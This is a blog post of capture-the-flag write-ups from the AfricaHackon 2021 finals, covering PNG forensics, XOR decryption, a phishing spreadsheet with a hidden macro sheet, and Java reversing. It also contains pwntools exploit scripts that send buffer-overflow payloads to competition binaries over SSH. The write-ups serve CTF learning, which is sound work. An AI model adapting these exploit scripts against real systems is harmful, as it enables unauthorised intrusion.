---
title: "AfricaHackon 2021 CTF Finals"
author: "Trevor saudi"
date: 2021-11-09T11:58:56.446Z
lastmod: 2022-05-24T14:32:12+03:00

description: ""

subtitle: "My team (fr334aks) and I had the pleasure of taking part in AH2021 CTF finals where we took 3rd out of the ten teams that qualified…"

image: "/posts/2021-11-09_africahackon-2021-ctf-finals/images/1.jpeg" 
images:
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/1.jpeg"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/2.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/3.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/4.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/5.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/6.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/7.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/8.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/9.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/10.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/11.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/12.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/13.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/14.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/15.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/16.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/17.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/18.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/19.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/20.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/21.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/22.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/23.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/24.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/25.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/26.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/27.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/28.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/29.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/30.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/31.jpeg"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/32.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/33.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/34.png"
 - "/posts/2021-11-09_africahackon-2021-ctf-finals/images/35.png"


aliases:
    - "/africahackon-2021-ctf-finals-8111f8edc408"


tags:
- Forensics
- Malware
- Pwn
- CTF
---

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/1.jpeg#layoutTextWidth)
> My team ([fr334aks](https://twitter.com/fr334aks)) and I had the pleasure of taking part in AH2021 CTF finals where we took 3rd out of the ten teams that qualified. Amazing experience, awesome learning opportunity and made new friends. Here are some of the writeups of challenges solved by us and other teams.

### EaZZy_Forensics 200pts

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/2.png#layoutTextWidth)


This was a pretty interesting challenge involving knowledge on image forensics.

We are provided with a png image. Several tools failed to open the image indicating the following error.

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/3.png#layoutTextWidth)


I tried opening with sublime text and got the following display.

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/4.png#layoutTextWidth)


We can use pngcheck to get more information concerning the image

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/5.png#layoutTextWidth)


Something immediately stuck out to me (**-2776.5% compression**) . If you compare it with a normal image, you will see the difference

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/6.png#layoutTextWidth)


The negative compression is reason enough why the image appears shrunk. So we proceed to play around with the image dimensions



This tool modsize, does the trick well.

```python3
 python2 /opt/modsize/modsize.py — width 709 — height 709 eazzzy.png output.png
 ```
![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/7.png#layoutTextWidth)


Opening the image, we get some output. I got stuck here for a while trying to make sense of writeups online till it came to me that we need the correct dimensions to actually get the right image

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/8.png#layoutTextWidth)


The dimensions i used initially doesn’t give us the right image, so what next?

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/9.png#layoutTextWidth)


I use a bash one-liner to get different image dimensions (different width same height).
```bash 
for i in {600..700}; do python2 /opt/modsize/modsize.py — width $i — height $i eazzzy.png out{$i}.png; done
```
![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/10.png#layoutTextWidth)


I went through each of the images painfully since we had around 10 minutes left and scripting would have costed some time.

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/11.png#layoutTextWidth)


We get our flag !

### NoT_So_Steg 100pts

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/12.png#layoutTextWidth)


This challenge was rather direct testing your knowledge on the logic of XOR encryption.

Keep in mind:

```bash
flag ^ key= encrypted_flag

encrypted_flag ^ key= flag
```
We are provided with the encrypted image and the code used to encrypt it.

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/13.png#layoutTextWidth)


Changing the flag.png to enc.png , we can get the original image. The decrypted flag appears at the bottom.

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/14.png#layoutTextWidth)


### Phished 250 pts

Our team didn’t solve the challenge till after the competition. credit to [ChasingFlags](https://twitter.com/levanto_0) for the hint on how to solve it.

We are provided with an excel file that is a phishing document. If I had opened with MS excel and enabled content (in the real world) I would have probably gotten hacked.

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/15.png#layoutTextWidth)


I started by dropping the file in [iris-h](https://iris-h.services/pages/dashboard)

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/16.png#layoutTextWidth)


Going through the output we can see a hidden macro sheet in the file. There is also information involving obfuscation of data.

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/17.png#layoutTextWidth)


I went back to my editor and tried unhiding the file. Right click on ```Sheet1``` > ```Unhide```

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/18.png#layoutTextWidth)


We get the ceslx file

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/19.png#layoutTextWidth)


I tried to change color of the text and see if we can uncover hidden text

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/20.png#layoutTextWidth)


we get something juicy. Let’s dig deeper. Select all (```Ctrl + A```) then change to red color and we uncover more

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/21.png#layoutTextWidth)


I thought that maybe the integers could be converted back to ascii characters so I copied the entire DV column to start with , to sublime text

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/22.png#layoutTextWidth)


We need to remove all text and remain with the integers, separated by columns. We can take advantage of multiple cursor functionality

```Ctrl+A``` to select all ,```Ctrl+Shift+L``` to spawn the cursors, then move them to the beginning

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/23.png#layoutTextWidth)


Start by deleting the ```=CHAR(```

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/24.png#layoutTextWidth)


Move to the end and delete ```**)**``` then replace with ```**,**```

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/25.png#layoutTextWidth)


Now replace ```&CHAR(``` with ```,``` and any remaining ```(``` or ```)``` with an empty string. You should have something like

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/26.png#layoutTextWidth)


Let’s put it all in brackets assign to a variable data and save as solution.py

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/27.png#layoutTextWidth)

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/28.png#layoutTextWidth)


Run our script, we get some gibberish output

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/29.png#layoutTextWidth)


Let’s pipe it to ```strings```

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/30.png#layoutTextWidth)


We get our flag!

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/31.jpeg#layoutTextWidth)
[Amarit](https://twitter.com/amarjit_labu?lang=en) (the author of this challenge) likes to fish as a hobby. Easter egg maybe xD?



Lets jump to some rev &amp; pwn. _The solves are as curated by_ [_Binarychunk_](https://twitter.com/binarychunk?lang=en) _our team member and talented hacker. Detailed writeups concerning the solves will be done on his blog._


### Namecheck 150pts



![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/32.png#layoutTextWidth)


``` python3
#!/usr/bin/python3
#author: @BinaryChunk
from pwn import *

#io = process("./chall")
sh = ssh("namecheck", "3.21.21.162", 22, password="guest")
io = sh.shell("./namecheck")

elf = ELF("./chall")

def main():
	payload = b"A"*36
	payload += p32(elf.sym.systemCheck)
	payload += b"A"*(274-len(payload))
	io.sendline(payload)
	io.interactive()

if __name__ == "__main__":
	main()
```



### Iamfree 250pts

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/33.png#layoutTextWidth)

```python3
#!/usr/bin/python3
#author: @BinaryChunk
from pwn import *

#io = process("./chall")
USER = "iamfree"
PASS = "guest"
PORT = 22
IP = "3.21.21.162"

shell = ssh(user=USER, host=IP, port=PORT, password=PASS)
io = shell.run("./iamfree")

def main():
	"""payload = p32(0x46524545)
	payload += p32(0x71756565)
	payload += p32(0x6e333e3a)
	payload += p32(0x6d343137)
	io.send(payload)"""

	payload = p32(0x4e455721)
	payload += p32(0x4b494e47)
	payload += p32(0x3f)
	payload += p32(0x6d343137)
	io.send(payload)
	payload += p32(0x75733334)
	payload += p32(0x66743352)
	payload += p32(0x66523333)
	io.send(payload)
	io.interactive()

if __name__ == "__main__":
	main()
```

### Parser 150pts

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/34.png#layoutTextWidth)

```python3
#!/usr/bin/python3
#author: @BinaryChunk
from pwn import *

a = ssh("parser", "3.21.21.162", 22, password="guest")
io = a.run("./parser")

def main():
	payload = "AAAA/AAAbAAAiAAAnAAA/AAAcAAAaAAAtAAA AAAfAAAlAAAaAAAg"
	io.sendline(payload)
	io.interactive()

if __name__ == "__main__":
	main()
```

### Processing 50pts

In processing, we are provided with an executable file that requests for a password when run.

![image](/posts/2021-11-09_africahackon-2021-ctf-finals/images/35.png#layoutTextWidth)


Using jadx-gui you can reverse the Challenge.jar file and view the source code. The approach taken here involves reversing the code and printing out the flag

```python3
#!/usr/bin/python3


bytes = list(open("file.png", "rb").read())
key = [81, 83, 410, 91, 162, 3, 79, 66, 281, 311, 69, 42, 60, 981, 526, 447, 787, 42, 528, 410, 1227, 877, 336, 354, 83, 1746, 1828, 842, 2734, 1340, 1597, 908, 1451, 1563, 1137, 2226, 1206, 2486, 1909, 1566, 1908, 1200, 3604, 4318, 1546, 1793, 1581]

flag = []


def main():
	for i in range(len(key)):
		flag.append(bytes[key[i] - 2])

	print("".join([chr(i) for i in flag]))


if __name__ == "__main__":
	main()
```
Another approach used by [ikuamike](http://twitter.com/ikuamike) ‘s solution involving editing the code directly to print the flag : [https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/](https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/) by ik

I hope you can recreate some of the solves. This writeup will be improved later to detail the solves in the rev/pwn and crypto category. Thanks for reading like, share and follow for more soon!

PS: you can read more on pwn rev and crypto solves in [https://lvmalware.github.io/writeup/2021/11/06/Africahackon-Finals.html](https://lvmalware.github.io/writeup/2021/11/06/Africahackon-Finals.html)
